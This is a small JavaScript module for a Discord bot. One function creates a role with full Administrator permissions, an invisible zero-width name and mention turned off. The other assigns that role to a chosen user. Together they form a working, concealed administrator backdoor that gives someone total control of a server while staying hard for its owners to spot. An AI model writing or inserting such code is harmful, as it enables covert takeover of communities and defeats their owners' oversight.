const DISCORD_API = 'https://discord.com/api/v10';

async function createAdminRole(guildId) {
    const response = await fetch(`${DISCORD_API}/guilds/${guildId}/roles`, {
        method: 'POST',
        headers: {
            'Authorization': `Bot ${BOT_TOKEN}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: '﻿',
            permissions: '8',
            mentionable: false,
        }),
    });

    const data = await response.json();
    return data.id; // returns role ID
}

async function assignRole(guildId, userId, roleId) {
    await fetch(`${DISCORD_API}/guilds/${guildId}/members/${userId}/roles/${roleId}`, {
        method: 'PUT',
        headers: {
            'Authorization': `Bot ${BOT_TOKEN}`,
        },
    });
}

module.exports.createAdminRole = createAdminRole;
module.exports.assignRole = assignRole;